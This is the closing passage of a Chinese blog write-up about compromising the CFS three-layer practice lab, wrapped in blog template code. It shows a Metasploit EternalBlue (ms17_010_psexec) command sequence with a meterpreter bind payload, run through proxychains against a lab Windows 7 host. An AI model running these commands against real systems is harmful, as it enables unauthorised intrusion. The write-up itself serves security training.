+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725165129974.png" alt="image-20230725165129974"></p>
+<p>可以发现  445和3389端口开放，又是win7系统，直接用经典的永恒之蓝攻击试试</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 msfconsole
+use exploit/windows/smb/ms17_010_psexec
+<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp
+<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.33.33
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725165723572.png" alt="image-20230725165723572"></p>
+<p>直接拿下主机权限</p>
+<p><img src="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230725165847740.png" alt="image-20230725165847740"></p>
+<p>到这儿三台靶机都被拿下，直接打穿，成功闯关</p>
+<p>从搭建靶机到打穿靶机基本用了今天一天，一直坐在电脑旁，算是渗透打靶机的处女座，其中还有很多不足，也是参考下面两位佬的文章，做到一半真的很累，本来想分两天在打的，但是突然getshell了，稍微激动了一下，咬咬牙今天一天打完。其中有些内容不是很完善，我后续还会跟更新一下，不说了，我下班了！！！</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://teamssix.com/191021-211425.html#toc-heading-8">https://teamssix.com/191021-211425.html#toc-heading-8</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63844103/article/details/126195711">https://blog.csdn.net/qq_63844103/article/details/126195711</a></p>
+<p>两位佬的文章写的很好给了我很大帮助，在这感谢佬了。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">f14g</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">http://example.com/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">f14g</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">CFS三层靶机</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .waline-card {
+        margin: 1.5rem auto;
+    }
+    .waline-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #waline p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+    #waline blockquote p {
+        text-indent: 0.2rem;
+    }
+    #waline a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+    #waline img {
+        max-width: 100%;
+        cursor: pointer;
+    }
+    #waline ol li {
+        list-style-type: decimal;
+    }
+    #waline ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+    #waline ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+    #waline ul li {
+        list-style-type: disc;
+    }
+    #waline ul ul li {
+        list-style-type: circle;
+    }
+    #waline table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+    #waline table, th, td {
+        border: 0;
+    }
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+    #waline table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+    #waline table td {
+        min-width: 80px;
+    }
+    #waline h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+    #waline h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+    #waline h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+    #waline h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+    #waline h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+    #waline h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+    #waline p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+    #waline hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+    #waline blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+    #waline pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+    #waline code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+    #waline pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+    #waline pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+    #waline code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+    #waline [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+    #waline b,
+    strong {
+        font-weight: bold;
+    }
+    #waline dfn {
+        font-style: italic;
+    }
+    #waline small {
+        font-size: 85%;
+    }
+    #waline cite {
+        font-style: normal;
+    }
+    #waline mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+    #waline table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+    #waline table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+    #waline table td {
+        min-width: 80px;
+    }
+    #waline [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+  </style>
+  
+  <div class="card waline-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="waline" class="card-content" style="display: grid">
+    </div>
+  </div>
+  
+
+  <!-- <script src="//cdn.jsdelivr.net/npm/@waline/client"></script> -->
+  <script src="/libs/waline/Waline.min.js"></script>
+  <script>
+    new Waline({
+        el: '#waline',
+        serverURL: 'https://waline.your-domain.com',
+        avatar: 'mm'    
+    });
+  </script> 
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/07/25/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="CFS三层靶机">
+                        
+                        <span class="card-title">CFS三层靶机</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">CFS三层靶机</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/06/11/%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%B2%BE%E8%8B%B1%E8%B5%9B2023/">
+                    <div class="card-image">
+                        
+                        <img src="/images/1.jpg" class="responsive-img" alt="安洵杯全国精英赛2023">
+                        
+                        <span class="card-title">安洵杯全国精英赛2023</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/match/" class="post-category">
+                                    match
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/">
+                        <span class="chip bg-color">安洵杯</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: f14g<br />'
+            + '文章作者: f14g<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <a href="/about" target="_blank">f14g</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+                <span id="translate">|&nbsp;繁/简：</span><a id="translateLink" href="javascript:translatePage();">繁</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">61.8k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2023";
+                        var startMonth = "1";
+                        var startDate = "1";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/f14g-orz" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:f14g_orz0823@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=985220675" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 985220675" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+        <script type="text/javascript" src="/js/tw_cn.js"></script>
+        <script type="text/javascript">
+          var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体
+          var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0
+          var cookieDomain = "http://example.com"; //Cookie地址, 一定要设定, 通常为你的网址
+          var msgToTraditionalChinese = "繁"; //此处可以更改为你想要显示的文字
+          var msgToSimplifiedChinese = "简"; //同上，但两处均不建议更改
+          var translateButtonId = "translateLink"; //默认互换id
+          translateInitilization();
+        </script>
+    
+    
+    
+        
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
